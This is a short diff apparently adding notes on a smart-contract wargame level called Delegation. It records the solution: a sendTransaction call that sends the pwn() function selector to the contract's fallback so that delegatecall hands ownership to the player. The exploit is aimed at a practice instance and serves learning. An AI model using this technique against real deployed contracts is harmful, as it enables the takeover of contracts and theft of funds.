@@ -1,0 +1,6 @@
+ 1) I called Delegation.sol's fallback function, and also using the bytes4(sha3("pwn()"))
+ 	await sendTransaction({
+  from: player,
+  to: instance,
+  data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
+})
